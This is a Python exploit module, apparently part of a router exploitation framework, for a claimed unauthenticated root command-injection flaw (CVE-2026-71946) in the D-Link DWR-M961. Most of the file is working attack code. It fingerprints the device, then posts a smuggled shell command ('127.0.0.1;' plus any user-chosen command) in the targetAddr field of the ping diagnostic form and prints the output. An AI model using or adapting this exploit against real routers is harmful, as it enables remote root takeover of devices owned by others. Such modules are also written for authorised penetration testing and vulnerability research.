# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-71946: D-Link DWR-M961 Unauth Root Cmd Exec via formPingDiagnosticRun.

The D-Link DWR-M961 router exposes an unauthenticated form handler
(/goform/formPingDiagnosticRun) that passes the ``targetAddr`` parameter
to a shell ping command without sanitization. An attacker can inject
arbitrary OS commands executed as root.

CVSS v3.1: 9.8 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
"""
import socket

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """D-Link DWR-M961 unauthenticated root command execution via
    formPingDiagnosticRun handler (CVE-2026-71946)."""

    __info__ = {
        "name": "CVE-2026-71946: D-Link DWR-M961 Unauth Root Cmd Exec (Ping Diagnostic)",
        "description": (
            "The D-Link DWR-M961 formPingDiagnosticRun handler passes "
            "the targetAddr parameter to system() without sanitization. "
            "An unauthenticated attacker executes arbitrary commands as root."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71946",
            "https://www.dlink.com/security-bulletin",
        ),
        "devices": (
            "D-Link DWR-M961 (all firmware versions)",
        ),
        "cve": "CVE-2026-71946",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1059", "T1190"],
        "mitre_tactics": ["Initial Access", "Execution"],
    }

    target = OptIP("", "Target IPv4 address of the DWR-M961 router")
    port = OptPort(80, "HTTP port (default: 80)")
    timeout = OptFloat(8.0, "Connection timeout in seconds")
    command = OptString("id", "OS command to inject (PoC; default: id)")

    _FORM_PATH = "/goform/formPingDiagnosticRun"

    @mute
    def check(self) -> bool:
        """Check if the target exposes the DWR-M961 web interface."""
        if HAS_REQUESTS:
            try:
                url = f"http://{self.target}:{self.port}/"
                resp = requests.get(url, timeout=self.timeout)
                body = resp.text.lower()
                return "dwr-m961" in body or "d-link" in body
            except Exception:
                pass
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.sendall(
                f"GET / HTTP/1.0\r\nHost: {self.target}\r\n\r\n".encode()
            )
            data = sock.recv(4096).decode(errors="replace").lower()
            sock.close()
            return "dwr-m961" in data or "d-link" in data
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if self.check():
            print_success(f"D-Link DWR-M961 detected at {self.target}:{self.port}")
        else:
            print_warning("Device not positively identified; proceeding anyway")

        self._exploit()

    def _exploit(self) -> None:
        injection = f"127.0.0.1;{self.command}"
        url = f"http://{self.target}:{self.port}{self._FORM_PATH}"
        data = {
            "targetAddr": injection,
            "pingCount": "1",
            "packetSize": "64",
        }

        print_status(f"Sending command injection to {url}")
        print_info(f"Payload: targetAddr={injection}")

        if HAS_REQUESTS:
            try:
                resp = requests.post(
                    url, data=data, timeout=self.timeout
                )
                print_info(f"HTTP {resp.status_code}")
                if resp.status_code == 200:
                    print_success("Form submitted. Command output (if any):")
                    print_info(resp.text[:1024])
                else:
                    print_warning(f"Unexpected status: {resp.status_code}")
            except Exception as exc:
                print_error(f"Request failed: {exc}")
        else:
            print_warning("requests library not installed; showing payload")
            print_info(f"POST {url}")
            print_info(f"Data: {data}")
